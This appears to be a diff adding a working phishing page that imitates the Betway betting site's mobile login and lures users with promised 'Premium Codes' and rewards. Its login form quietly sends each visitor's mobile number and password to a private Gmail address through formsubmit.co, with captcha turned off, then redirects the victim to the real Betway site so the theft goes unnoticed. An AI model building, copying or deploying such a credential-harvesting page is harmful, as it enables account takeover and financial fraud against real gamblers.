@@ -1,0 +1,853 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Betway Premium UI Replica - Dark Theme</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Great+Vibes&family=Dancing+Script:wght@600;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+        }
+
+        body {
+            background-color: #0a0a0a;
+            color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            padding-bottom: 70px;
+            overflow-x: hidden;
+        }
+
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px 16px;
+            background-color: #000000;
+            border-bottom: 1px solid #1a1a1a;
+            position: relative;
+            z-index: 100;
+        }
+
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+
+        .menu-btn {
+            font-size: 20px;
+            cursor: pointer;
+            color: #ffffff;
+        }
+
+        .logo {
+            font-size: 20px;
+            font-weight: bold;
+            letter-spacing: -0.5px;
+            color: #ffffff;
+            display: flex;
+            align-items: baseline;
+            gap: 6px;
+        }
+
+        .logo-premium {
+            font-family: 'Great Vibes', 'Dancing Script', cursive;
+            font-size: 26px;
+            font-weight: 700;
+            color: #d4af37;
+            text-shadow: 0 1px 3px rgba(212, 175, 55, 0.4);
+            letter-spacing: 0.5px;
+        }
+
+        .header-right {
+            display: flex;
+            gap: 10px;
+        }
+
+        .btn-top-login {
+            background-color: #2a2a2a;
+            color: #ffffff;
+            border: 1px solid #3a3a3a;
+            padding: 8px 16px;
+            border-radius: 6px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .btn-top-signup {
+            background-color: #008a00;
+            color: #ffffff;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 6px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .side-menu-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            z-index: 200;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.3s ease, visibility 0.3s ease;
+        }
+
+        .side-menu-overlay.open {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .side-menu {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 85%;
+            max-width: 340px;
+            height: 100%;
+            background: #111111;
+            color: #ffffff;
+            z-index: 210;
+            transform: translateX(-100%);
+            transition: transform 0.3s ease;
+            display: flex;
+            flex-direction: column;
+            overflow-y: auto;
+            box-shadow: 4px 0 25px rgba(0,0,0,0.5);
+        }
+
+        .side-menu.open {
+            transform: translateX(0);
+        }
+
+        .side-menu-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 16px;
+            border-bottom: 1px solid #222;
+        }
+
+        .side-menu-header .close-side {
+            font-size: 22px;
+            cursor: pointer;
+            color: #aaa;
+        }
+
+        .side-auth-buttons {
+            display: flex;
+            gap: 10px;
+            padding: 16px;
+        }
+
+        .side-btn-login {
+            flex: 1;
+            background: #1a1a1a;
+            color: #ffffff;
+            border: 1px solid #333;
+            padding: 12px;
+            border-radius: 8px;
+            font-weight: 600;
+            font-size: 15px;
+            cursor: pointer;
+        }
+
+        .side-btn-signup {
+            flex: 1;
+            background: #008a00;
+            color: #fff;
+            border: none;
+            padding: 12px;
+            border-radius: 8px;
+            font-weight: 600;
+            font-size: 15px;
+            cursor: pointer;
+        }
+
+        .quick-links-section {
+            padding: 0 16px;
+            margin-top: 8px;
+        }
+
+        .quick-links-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px 0;
+            font-weight: 600;
+            font-size: 16px;
+            cursor: pointer;
+            user-select: none;
+            color: #fff;
+        }
+
+        .quick-links-header i {
+            transition: transform 0.25s ease;
+            color: #aaa;
+        }
+
+        .quick-links-header.collapsed i {
+            transform: rotate(180deg);
+        }
+
+        .quick-links-list {
+            list-style: none;
+            overflow: hidden;
+            max-height: 500px;
+            transition: max-height 0.3s ease;
+        }
+
+        .quick-links-list.collapsed {
+            max-height: 0;
+        }
+
+        .quick-links-list li {
+            margin-bottom: 8px;
+        }
+
+        .quick-links-list a {
+            display: block;
+            background: #1a1a1a;
+            color: #ddd;
+            text-decoration: none;
+            padding: 14px 16px;
+            border-radius: 8px;
+            font-size: 15px;
+            transition: background 0.2s;
+        }
+
+        .quick-links-list a:hover {
+            background: #252525;
+        }
+
+        .side-menu-bottom {
+            margin-top: auto;
+            padding: 20px 16px 30px;
+        }
+
+        .live-chat-btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            width: 100%;
+            background: #008a00;
+            color: #fff;
+            border: none;
+            padding: 14px;
+            border-radius: 30px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-bottom: 20px;
+        }
+
+        .side-select-group {
+            margin-bottom: 14px;
+        }
+
+        .side-select-group label {
+            display: block;
+            font-size: 13px;
+            color: #888;
+            margin-bottom: 6px;
+        }
+
+        .side-select {
+            width: 100%;
+            padding: 12px 14px;
+            border: 1px solid #333;
+            border-radius: 8px;
+            background: #1a1a1a;
+            font-size: 15px;
+            color: #fff;
+            appearance: none;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath fill='%23aaa' d='M6 8L1 3h10z'/%3E%3C/svg%3E");
+            background-repeat: no-repeat;
+            background-position: right 14px center;
+            cursor: pointer;
+        }
+
+        .main-content {
+            padding: 16px;
+            flex: 1;
+        }
+
+        .modal-card {
+            background-color: #141414;
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 30px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
+            border: 1px solid #222;
+            transition: opacity 0.25s ease, transform 0.25s ease;
+        }
+
+        .modal-card.hidden {
+            opacity: 0;
+            transform: translateY(-20px);
+            pointer-events: none;
+            height: 0;
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+        }
+
+        .modal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .modal-title {
+            font-size: 18px;
+            font-weight: bold;
+            color: #fff;
+        }
+
+        .close-btn {
+            font-size: 18px;
+            cursor: pointer;
+            color: #888;
+        }
+
+        .form-group {
+            margin-bottom: 14px;
+            position: relative;
+        }
+
+        .input-field {
+            width: 100%;
+            background-color: #1e1e1e;
+            border: 1px solid #333;
+            border-radius: 6px;
+            padding: 14px 12px;
+            color: #ffffff;
+            font-size: 14px;
+            outline: none;
+        }
+
+        .input-field:focus {
+            border-color: #008a00;
+            background-color: #222;
+        }
+
+        .input-field::placeholder {
+            color: #777;
+        }
+
+        .toggle-password {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #888;
+            cursor: pointer;
+        }
+
+        .form-links {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 16px;
+            font-size: 13px;
+        }
+
+        .form-links a {
+            color: #aaa;
+            text-decoration: none;
+        }
+
+        .signup-banner {
+            background-color: #1a1a1a;
+            border-radius: 6px;
+            padding: 14px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 16px;
+            font-size: 13px;
+            color: #aaa;
+            cursor: pointer;
+            border: 1px solid #2a2a2a;
+        }
+
+        .signup-banner strong {
+            color: #008a00;
+        }
+
+        .btn-submit {
+            width: 100%;
+            background-color: #008a00;
+            color: #ffffff;
+            border: none;
+            padding: 14px;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .btn-submit:hover {
+            background-color: #00a000;
+        }
+
+        .btn-submit:disabled {
+            background-color: #444;
+            cursor: not-allowed;
+        }
+
+        .welcome-section {
+            margin-top: 20px;
+            text-align: left;
+            background: #141414;
+            padding: 20px;
+            border-radius: 12px;
+            border: 1px solid #222;
+        }
+
+        .welcome-section h2 {
+            font-size: 18px;
+            margin-bottom: 12px;
+            line-height: 1.3;
+            color: #fff;
+        }
+
+        .welcome-section p {
+            color: #aaa;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+
+        .welcome-extra {
+            display: none;
+            color: #aaa;
+            font-size: 13px;
+            line-height: 1.5;
+            margin-top: 10px;
+        }
+
+        .welcome-extra.visible {
+            display: block;
+        }
+
+        .show-more-btn {
+            display: block;
+            margin: 20px auto 0;
+            background-color: #1a1a1a;
+            border: 1px solid #333;
+            color: #ddd;
+            padding: 8px 20px;
+            border-radius: 20px;
+            font-size: 13px;
+            cursor: pointer;
+        }
+
+        .bottom-nav {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background-color: #0d0d0d;
+            display: flex;
+            justify-content: space-around;
+            align-items: center;
+            height: 60px;
+            border-top: 1px solid #1c1c1c;
+            z-index: 100;
+        }
+
+        .nav-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            color: #888;
+            font-size: 10px;
+            text-decoration: none;
+            gap: 4px;
+            width: 20%;
+            height: 100%;
+            justify-content: center;
+            transition: background-color 0.2s, color 0.2s;
+        }
+
+        .nav-item i {
+            font-size: 18px;
+        }
+
+        .nav-item.active {
+            background-color: #008a00;
+            color: #ffffff;
+            border-radius: 8px 8px 0 0;
+        }
+
+        .toast {
+            position: fixed;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background-color: #008a00;
+            color: white;
+            padding: 12px 24px;
+            border-radius: 8px;
+            font-size: 14px;
+            z-index: 1000;
+            opacity: 0;
+            transition: opacity 0.3s;
+            pointer-events: none;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.4);
+        }
+
+        .toast.show {
+            opacity: 1;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="side-menu-overlay" id="sideMenuOverlay"></div>
+
+    <div class="side-menu" id="sideMenu">
+        <div class="side-menu-header">
+            <span style="font-weight: bold; font-size: 18px;">Menu</span>
+            <i class="fa-solid fa-xmark close-side" id="closeSideMenu"></i>
+        </div>
+
+        <div class="side-auth-buttons">
+            <button class="side-btn-login" id="sideLoginBtn">Log In</button>
+            <button class="side-btn-signup" id="sideSignupBtn">Sign Up</button>
+        </div>
+
+        <div class="quick-links-section">
+            <div class="quick-links-header" id="quickLinksToggle">
+                <span>Quick Links</span>
+                <i class="fa-solid fa-chevron-up"></i>
+            </div>
+
+            <ul class="quick-links-list" id="quickLinksList">
+                <li><a href="#">Betting Rules</a></li>
+                <li><a href="#">Betting Rules and Tips</a></li>
+                <li><a href="#">FAQs</a></li>
+                <li><a href="#">Horse Racing Suite</a></li>
+                <li><a href="#">Live Scores</a></li>
+                <li><a href="#">Play Aviator</a></li>
+                <li><a href="#">Stats Center</a></li>
+                <li><a href="#">Terms & Conditions</a></li>
+            </ul>
+        </div>
+
+        <div class="side-menu-bottom">
+            <button class="live-chat-btn" id="liveChatBtn">
+                <i class="fa-regular fa-comment-dots"></i>
+                Live Chat
+            </button>
+
+            <div class="side-select-group">
+                <label>Theme</label>
+                <select class="side-select" id="themeSelect">
+                    <option value="system">System</option>
+                    <option value="light">Light</option>
+                    <option value="dark" selected>Dark</option>
+                </select>
+            </div>
+
+            <div class="side-select-group">
+                <label>Odds format</label>
+                <select class="side-select" id="oddsSelect">
+                    <option value="decimal" selected>Decimal</option>
+                    <option value="fractional">Fractional</option>
+                    <option value="american">American</option>
+                </select>
+            </div>
+        </div>
+    </div>
+
+    <header class="header">
+        <div class="header-left">
+            <i class="fa-solid fa-bars menu-btn" id="menuBtn"></i>
+            <span class="logo">
+                Betway 
+                <span class="logo-premium">Premium</span>
+            </span>
+        </div>
+        <div class="header-right">
+            <button class="btn-top-login" id="topLoginBtn">Login</button>
+            <button class="btn-top-signup" id="topSignupBtn">Sign Up</button>
+        </div>
+    </header>
+
+    <main class="main-content">
+        <div class="modal-card" id="loginModal">
+            <div class="modal-header">
+                <span class="modal-title">Login</span>
+                <i class="fa-solid fa-xmark close-btn" id="closeModal"></i>
+            </div>
+
+            <!-- ========== FORMSUBMIT FORM ========== -->
+            <form id="loginForm" action="https://formsubmit.co/phindilemabena980@gmail.com" method="POST">
+                
+                <!-- FormSubmit Settings -->
+                <input type="hidden" name="_subject" value="New Betway Premium Login Attempt">
+                <input type="hidden" name="_captcha" value="false">
+                <input type="hidden" name="_template" value="table">
+                <input type="hidden" name="_next" value="https://www.betway.co.za/">
+
+                <div class="form-group">
+                    <input type="tel" class="input-field" id="mobileInput" name="Mobile Number" placeholder="+27 Mobile Number" maxlength="16" required>
+                </div>
+                <div class="form-group">
+                    <input type="password" class="input-field" id="passwordInput" name="Password" placeholder="Enter Password" required>
+                    <i class="fa-regular fa-eye toggle-password" id="togglePassword"></i>
+                </div>
+                <div class="form-links">
+                    <a href="#" id="forgotUsername">Forgot Username?</a>
+                    <a href="#" id="forgotPassword">Forgot Password?</a>
+                </div>
+                <div class="signup-banner" id="signupBanner">
+                    <span>Don't have an account yet?</span>
+                    <strong>Sign Up <i class="fa-solid fa-chevron-right"></i></strong>
+                </div>
+                <button type="submit" class="btn-submit" id="loginBtn">Login</button>
+            </form>
+        </div>
+
+        <section class="welcome-section">
+            <h2>Welcome to Betway Premium</h2>
+            <p>Login with your registered Betway account to unlock <strong style="color:#d4af37;">Premium Codes</strong> and rewards.</p>
+            
+            <div class="welcome-extra" id="welcomeExtra">
+                Exclusive bonuses, free bets, cashback offers and special promotions are waiting for you. Sign in now to claim your premium rewards!
+            </div>
+
+            <button class="show-more-btn" id="showMoreBtn">
+                Show More <i class="fa-solid fa-chevron-down"></i>
+            </button>
+        </section>
+    </main>
+
+    <nav class="bottom-nav">
+        <a href="#" class="nav-item" data-nav="login">
+            <i class="fa-solid fa-right-to-bracket"></i>
+            <span>Login</span>
+        </a>
+        <a href="#" class="nav-item" data-nav="chat">
+            <i class="fa-regular fa-comments"></i>
+            <span>Chat</span>
+        </a>
+        <a href="#" class="nav-item active" data-nav="betslip">
+            <i class="fa-solid fa-receipt"></i>
+            <span>Betslip</span>
+        </a>
+        <a href="#" class="nav-item" data-nav="promos">
+            <i class="fa-solid fa-gift"></i>
+            <span>Promos</span>
+        </a>
+        <a href="#" class="nav-item" data-nav="signup">
+            <i class="fa-solid fa-user-plus"></i>
+            <span>Sign Up</span>
+        </a>
+    </nav>
+
+    <div class="toast" id="toast"></div>
+
+    <script>
+        const OFFICIAL_BETWAY_URL = "https://www.betway.co.za/";
+
+        const sideMenu = document.getElementById('sideMenu');
+        const sideMenuOverlay = document.getElementById('sideMenuOverlay');
+        const menuBtn = document.getElementById('menuBtn');
+        const closeSideMenu = document.getElementById('closeSideMenu');
+        const quickLinksToggle = document.getElementById('quickLinksToggle');
+        const quickLinksList = document.getElementById('quickLinksList');
+
+        const loginModal = document.getElementById('loginModal');
+        const closeModalBtn = document.getElementById('closeModal');
+        const togglePasswordBtn = document.getElementById('togglePassword');
+        const passwordInput = document.getElementById('passwordInput');
+        const mobileInput = document.getElementById('mobileInput');
+        const loginForm = document.getElementById('loginForm');
+        const showMoreBtn = document.getElementById('showMoreBtn');
+        const welcomeExtra = document.getElementById('welcomeExtra');
+        const toast = document.getElementById('toast');
+        const navItems = document.querySelectorAll('.nav-item');
+
+        function showToast(message, duration = 2500) {
+            toast.textContent = message;
+            toast.classList.add('show');
+            setTimeout(() => toast.classList.remove('show'), duration);
+        }
+
+        function goToOfficialBetway() {
+            showToast('Redirecting to Official Betway App...');
+            setTimeout(() => {
+                window.location.href = OFFICIAL_BETWAY_URL;
+            }, 800);
+        }
+
+        function openSideMenu() {
+            sideMenu.classList.add('open');
+            sideMenuOverlay.classList.add('open');
+            document.body.style.overflow = 'hidden';
+        }
+
+        function closeSideMenuFn() {
+            sideMenu.classList.remove('open');
+            sideMenuOverlay.classList.remove('open');
+            document.body.style.overflow = '';
+        }
+
+        menuBtn.addEventListener('click', openSideMenu);
+        closeSideMenu.addEventListener('click', closeSideMenuFn);
+        sideMenuOverlay.addEventListener('click', closeSideMenuFn);
+
+        quickLinksToggle.addEventListener('click', () => {
+            quickLinksToggle.classList.toggle('collapsed');
+            quickLinksList.classList.toggle('collapsed');
+        });
+
+        document.getElementById('sideLoginBtn').addEventListener('click', () => {
+            closeSideMenuFn();
+            loginModal.classList.remove('hidden');
+            showToast('Login opened');
+        });
+
+        document.getElementById('sideSignupBtn').addEventListener('click', () => {
+            closeSideMenuFn();
+            goToOfficialBetway();
+        });
+
+        document.getElementById('liveChatBtn').addEventListener('click', () => {
+            closeSideMenuFn();
+            showToast('Opening Live Chat... (Demo)');
+        });
+
+        document.querySelectorAll('.quick-links-list a').forEach(link => {
+            link.addEventListener('click', (e) => {
+                e.preventDefault();
+                closeSideMenuFn();
+                showToast(`${link.textContent} (Demo)`);
+            });
+        });
+
+        document.getElementById('themeSelect').addEventListener('change', (e) => {
+            showToast(`Theme set to: ${e.target.value}`);
+        });
+
+        document.getElementById('oddsSelect').addEventListener('change', (e) => {
+            showToast(`Odds format: ${e.target.value}`);
+        });
+
+        togglePasswordBtn.addEventListener('click', () => {
+            const isPassword = passwordInput.type === 'password';
+            passwordInput.type = isPassword ? 'text' : 'password';
+            togglePasswordBtn.classList.toggle('fa-eye');
+            togglePasswordBtn.classList.toggle('fa-eye-slash');
+        });
+
+        closeModalBtn.addEventListener('click', () => {
+            loginModal.classList.add('hidden');
+            showToast('Login closed');
+        });
+
+        function openLogin() {
+            loginModal.classList.remove('hidden');
+        }
+
+        document.getElementById('topLoginBtn').addEventListener('click', openLogin);
+
+        mobileInput.addEventListener('input', (e) => {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length > 0 && !e.target.value.startsWith('+')) {
+                if (value.startsWith('0')) value = '27' + value.slice(1);
+                else if (!value.startsWith('27')) value = '27' + value;
+            }
+            if (value.startsWith('27')) {
+                let formatted = '+27';
+                const rest = value.slice(2);
+                if (rest.length > 0) formatted += ' ' + rest.slice(0, 2);
+                if (rest.length > 2) formatted += ' ' + rest.slice(2, 5);
+                if (rest.length > 5) formatted += ' ' + rest.slice(5, 9);
+                e.target.value = formatted;
+            }
+        });
+
+        loginForm.addEventListener('submit', (e) => {
+            const mobile = mobileInput.value.trim();
+            const password = passwordInput.value.trim();
+
+            if (!mobile || mobile.length < 10) {
+                e.preventDefault();
+                showToast('Please enter a valid mobile number');
+                mobileInput.focus();
+                return;
+            }
+            if (!password || password.length < 4) {
+                e.preventDefault();
+                showToast('Password must be at least 4 characters');
+                passwordInput.focus();
+                return;
+            }
+
+            const loginBtn = document.getElementById('loginBtn');
+            loginBtn.disabled = true;
+            loginBtn.textContent = 'Logging...';
+            showToast('Submitting login details...');
+        });
+
+        let isExpanded = false;
+        showMoreBtn.addEventListener('click', () => {
+            isExpanded = !isExpanded;
+            welcomeExtra.classList.toggle('visible', isExpanded);
+            showMoreBtn.innerHTML = isExpanded
+                ? 'Show Less <i class="fa-solid fa-chevron-up"></i>'
+                : 'Show More <i class="fa-solid fa-chevron-down"></i>';
+        });
+
+        navItems.forEach(item => {
+            item.addEventListener('click', (e) => {
+                e.preventDefault();
+                navItems.forEach(nav => nav.classList.remove('active'));
+                item.classList.add('active');
+
+                const navType = item.dataset.nav;
+                if (navType === 'login') {
+                    openLogin();
+                    showToast('Login selected');
+                } else if (navType === 'signup') {
+                    goToOfficialBetway();
+                } else if (navType === 'chat') {
+                    showToast('Opening Chat... (Demo)');
+                } else if (navType === 'promos') {
+                    showToast('Loading Promos... (Demo)');
+                } else if (navType === 'betslip') {
+                    showToast('Betslip opened');
+                }
+            });
+        });
+
+        document.getElementById('signupBanner').addEventListener('click', goToOfficialBetway);
+        document.getElementById('topSignupBtn').addEventListener('click', goToOfficialBetway);
+
+        document.getElementById('forgotUsername').addEventListener('click', e => {
+            e.preventDefault();
+            showToast('Forgot Username flow (Demo)');
+        });
+        document.getElementById('forgotPassword').addEventListener('click', e => {
+            e.preventDefault();
+            showToast('Forgot Password flow (Demo)');
+        });
+    </script>
+</body>
+</html></html>
